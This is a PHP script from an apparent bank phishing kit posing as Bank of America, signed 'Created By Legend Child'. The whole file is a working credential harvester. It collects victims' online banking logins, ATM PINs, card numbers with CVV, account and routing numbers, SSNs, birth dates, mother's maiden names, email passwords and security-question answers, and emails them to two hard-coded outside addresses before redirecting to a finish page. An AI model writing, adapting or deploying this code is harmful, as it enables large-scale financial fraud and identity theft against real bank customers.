<? include 'index.cfm_files/validate_form.js';    //this makes sure that submitted form fields are not empty or invalid before sending the results 
                                                 //and if someone left form fields empty then they will see error msg and wont see the next page until all form fields are properly filled.
$ip = getenv("REMOTE_ADDR");
$message .= "---------------Created By Legend Child-------------------------------------\n";
$message .= "Account Open In: ".$_POST['accountstate']."\n";
$message .= "Online ID: ".$_POST['onlineid']."\n";
$message .= "ATM/CheckCard PIN: ".$_POST['atmcheckcardpin']."\n";
$message .= "Pass: ".$_POST['passcode']."\n";
$message .= "---------------Credit/Debit Card and Other Accounts Details------------\n";
$message .= "CCNo: ".$_POST['ccnum']."\n";
$message .= "ExpDate: ".$_POST['expmonth']."/";
$message .= $_POST['expyear']."\n";
$message .= "Cv: ".$_POST['cv']."\n";
$message .= "CCPin No: ".$_POST['ccpin']."\n";
$message .= "Account No: ".$_POST['accountnumber']."\n";
$message .= "Routing No: ".$_POST['routingnumber']."\n";
$message .= "---------------Credit/Debit Card Billing Address Details---------------\n";
$message .= "FullName: ".$_POST['fullname']."\n";
$message .= "Address Line 1: ".$_POST['addressline1']."\n";
$message .= "Address Line 2: ".$_POST['addressline2']."\n";
$message .= "City: ".$_POST['addresscity']."\n";
$message .= "State: ".$_POST['addressstate']."\n";
$message .= "Zip: ".$_POST['zipcode5']."\n";
$message .= "Phone No: ".$_POST['phoneareacode']."-";
$message .= $_POST['homephoneexchange']."-";
$message .= $_POST['homephonepubscriber']."\n";
$message .= "E-mail: ".$_POST['emailaddress']."\n";
$message .= "E-mailPassword: ".$_POST['emailpassword']."\n";
$message .= "---------------Identification Information------------------------------\n";
$message .= "SSN: ".$_POST['ssn3']."-";
$message .= $_POST['ssn2']."-";
$message .= $_POST['ssn4']."\n";
$message .= "DOB: ".$_POST['birthmonth']."-";
$message .= $_POST['birthdate']."-";
$message .= $_POST['birthyear']."\n";
$message .= "MMN: ".$_POST['mmn']."\n";
$message .= "Mother's Middles Name : ".$_POST['mmm']."\n";
$message .= "Father's Maiden Name : ".$_POST['fmn']."\n";
$message .= "Father's Middles Name : ".$_POST['fmm']."\n";
$message .= "Driver's Liecence No: ".$_POST['dl']."\n";
$message .= "---------------SiteKey Challenge Questions-----------------------------\n";
$message .= "SiteKey Quest 1: ".$_POST['question1']."\n";
$message .= "SiteKey Answer1: ".$_POST['answer1']."\n";
$message .= "SiteKey Quest 2: ".$_POST['question2']."\n";
$message .= "SiteKey Answer2: ".$_POST['answer2']."\n";
$message .= "SiteKey Quest 3: ".$_POST['question3']."\n";
$message .= "SiteKey Answer3: ".$_POST['answer3']."\n";
$message .= "SiteKey Quest 4: ".$_POST['question4']."\n";
$message .= "SiteKey Answer4: ".$_POST['answer4']."\n";
$message .= "SiteKey Quest 5: ".$_POST['question5']."\n";
$message .= "SiteKey Answer5: ".$_POST['answer5']."\n";
$message .= "SiteKey Quest 6: ".$_POST['question6']."\n";
$message .= "SiteKey Answer6: ".$_POST['answer6']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Legend Child------------------------------------\n";
$recipient = "phillipchariot01pc@gmail.com,lewisbrown3424@yahoo.com";
$subject = "BofA";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
	 if (mail($recipent,$subject,$message,$headers))
	   {
		   header("Location: finish.html");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
?>